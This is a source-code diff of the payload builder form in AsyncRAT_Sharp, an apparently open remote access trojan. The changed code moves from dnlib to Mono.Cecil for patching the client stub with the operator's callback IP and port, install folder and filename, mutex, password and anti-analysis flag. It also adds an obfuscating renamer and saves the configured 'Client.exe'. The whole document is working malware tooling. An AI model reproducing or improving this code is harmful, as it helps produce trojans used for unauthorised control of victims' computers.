@@ -1,10 +1,8 @@
 ﻿using System;
-using System.Linq;
 using System.Windows.Forms;
-using dnlib.DotNet;
-using dnlib.DotNet.Emit;
-using System.IO;
-using System.Threading.Tasks;
+using Mono.Cecil;
+using AsyncRAT_Sharp.Helper;
+using Mono.Cecil.Cil;
 
 namespace AsyncRAT_Sharp.Forms
 {
@@ -15,101 +13,48 @@ namespace AsyncRAT_Sharp.Forms
             InitializeComponent();
         }
 
-        private async void button1_Click(object sender, EventArgs e)
+        private void button1_Click(object sender, EventArgs e)
         {
-
             if (string.IsNullOrWhiteSpace(textIP.Text) || string.IsNullOrWhiteSpace(textPort.Text)) return;
+
             if (checkBox1.Checked)
             {
                 if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
                 if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
             }
+
             if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = Guid.NewGuid().ToString().Substring(10);
 
             try
             {
-                button1.Enabled = false;
-                var md = ModuleDefMD.Load(Path.Combine(Application.StartupPath, @"Stub\Stub.exe"));
-                foreach (TypeDef type in md.Types)
+                using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(@"Stub/Stub.exe"))
                 {
-                    if (type.Name == "Settings")
-                        foreach (MethodDef method in type.Methods)
-                        {
-                            if (method.Body == null) continue;
-                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
-                            {
-                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
-                                {
-                                    if (method.Body.Instructions[i].Operand.ToString() == "127.0.0.1")
-                                        method.Body.Instructions[i].Operand = textIP.Text;
+                    WriteSettings(asmDef);
 
-                                    if (method.Body.Instructions[i].Operand.ToString() == "6606")
-                                        method.Body.Instructions[i].Operand = textPort.Text;
+                    Renamer r = new Renamer(asmDef);
 
-                                    if (method.Body.Instructions[i].Operand.ToString() == "%AppData%")
-                                        method.Body.Instructions[i].Operand = comboBoxFolder.Text;
+                    if (!r.Perform())
+                        throw new Exception("renaming failed");
 
-                                    if (method.Body.Instructions[i].Operand.ToString() == "Payload.exe")
-                                        method.Body.Instructions[i].Operand = textFilename.Text;
-
-                                    if (method.Body.Instructions[i].Operand.ToString() == "false")
-                                        method.Body.Instructions[i].Operand = checkBox1.Checked.ToString().ToLower();
-
-                                    if (method.Body.Instructions[i].Operand.ToString() == "%Anti%")
-                                        method.Body.Instructions[i].Operand = chkAnti.Checked.ToString().ToLower();
-
-                                    if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
-                                        method.Body.Instructions[i].Operand = txtMutex.Text;
-
-                                    if (method.Body.Instructions[i].Operand.ToString() == "NYAN CAT")
-                                        method.Body.Instructions[i].Operand = Settings.Password;
-                                }
-                            }
-                        }
-                }
-
-                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
-                saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
-                saveFileDialog1.InitialDirectory = Application.StartupPath;
-                saveFileDialog1.OverwritePrompt = false;
-                saveFileDialog1.FileName = "Client";
-                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
-                {
-                    bool isok = false; ;
-                    await Task.Run(() =>
+                    // PHASE 3 - Saving
+                    using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                     {
-                        try
+                        saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
+                        saveFileDialog1.InitialDirectory = Application.StartupPath;
+                        saveFileDialog1.OverwritePrompt = false;
+                        saveFileDialog1.FileName = "Client";
+                        if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                         {
-                            md.Write(saveFileDialog1.FileName);
-                            isok = true;
+                            r.AsmDef.Write(saveFileDialog1.FileName);
+                            MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                            this.Close();
                         }
-                        catch (Exception ex)
-                        {
-                            MessageBox.Show(ex.Message, "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                            isok = false;
-                        }
-                    });
-                    if (isok == true)
-                    {
-                        MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                        Properties.Settings.Default.DNS = textIP.Text;
-                        Properties.Settings.Default.Filename = textFilename.Text;
-                        Properties.Settings.Default.Mutex = txtMutex.Text;
-                        Properties.Settings.Default.Save();
-                        button1.Enabled = true;
-                        this.Close();
                     }
-                    else
-                        button1.Enabled = true;
                 }
-                else
-                    button1.Enabled = true;
-
             }
             catch (Exception ex)
             {
                 MessageBox.Show(ex.Message, "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                button1.Enabled = true;
             }
         }
 
@@ -143,6 +88,61 @@ namespace AsyncRAT_Sharp.Forms
 
             if (Properties.Settings.Default.Mutex.Length > 0)
                 txtMutex.Text = Properties.Settings.Default.Mutex;
+        }
+
+        private void WriteSettings(AssemblyDefinition asmDef)
+        {
+            foreach (var typeDef in asmDef.Modules[0].Types)
+            {
+                if (typeDef.FullName == "Client.Settings")
+                {
+                    foreach (var methodDef in typeDef.Methods)
+                    {
+                        if (methodDef.Name == ".cctor")
+                        {
+                            int strings = 1;
+
+                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
+                            {
+                                if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr) // string
+                                {
+                                    switch (strings)
+                                    {
+                                        case 1: //port
+                                            methodDef.Body.Instructions[i].Operand = textPort.Text;
+                                            break;
+                                        case 2: //ip
+                                            methodDef.Body.Instructions[i].Operand = textIP.Text;
+                                            break;
+                                        case 3: //version
+                                            methodDef.Body.Instructions[i].Operand = Settings.Version;
+                                            break;
+                                        case 4: //install
+                                            methodDef.Body.Instructions[i].Operand = checkBox1.Checked.ToString().ToLower();
+                                            break;
+                                        case 5: //folder
+                                            methodDef.Body.Instructions[i].Operand = comboBoxFolder.Text;
+                                            break;
+                                        case 6: //filename
+                                            methodDef.Body.Instructions[i].Operand = textFilename.Text;
+                                            break;
+                                        case 7: //password
+                                            methodDef.Body.Instructions[i].Operand = Settings.Password;
+                                            break;
+                                        case 8: //mutex
+                                            methodDef.Body.Instructions[i].Operand = txtMutex.Text;
+                                            break;
+                                        case 9: //anti
+                                            methodDef.Body.Instructions[i].Operand = chkAnti.Checked.ToString().ToLower();
+                                            break;
+                                    }
+                                    strings++;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
         }
     }
 }
